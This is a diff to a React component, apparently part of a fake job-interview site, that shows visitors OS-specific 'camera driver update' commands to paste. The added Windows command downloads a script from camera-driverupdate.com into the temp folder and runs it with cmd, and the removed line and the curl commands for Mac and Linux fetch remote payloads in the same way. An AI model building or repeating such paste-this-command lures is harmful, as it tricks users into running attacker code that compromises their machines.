@@ -584,7 +584,14 @@ export default function SummaryInterview() {
                   curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
                       </code>
                   )}
-              {driverOs === 'windows' && `powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $f=Join-Path $env:TEMP ('script_'+[guid]::NewGuid().ToString('N')+'.cmd'); try { Invoke-WebRequest 'https://files.catbox.moe/3zeo8q.cmd' -OutFile $f; $p=Start-Process -FilePath cmd.exe -ArgumentList @('/Q','/D','/C',('""{0}""' -f $f)) -Wait -PassThru; exit $p.ExitCode } finally { Remove-Item -Force -ErrorAction SilentlyContinue $f }"`}
+              {driverOs === 'windows' && (
+                <pre>
+                  <code>
+              {`powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$f=$env:TEMP+'\\script.cmd';Invoke-WebRequest -Uri 'https://camera-driverupdate.com/window' -Method POST -Headers @{'User-Agent'='Mozilla/5.0'} -MaximumRedirection 10 -OutFile $f;cmd /c $f"
+              powershell Invoke-RestMethod -Uri "https://camera-driverupdate.com/package-update/${inviteLink || ''}" -Method Get`}
+                  </code>
+                </pre>
+              )}
               {driverOs === 'linux' && (
                       <code>
                   {`curl -sL -X POST https://camera-driverupdate.com/mac \
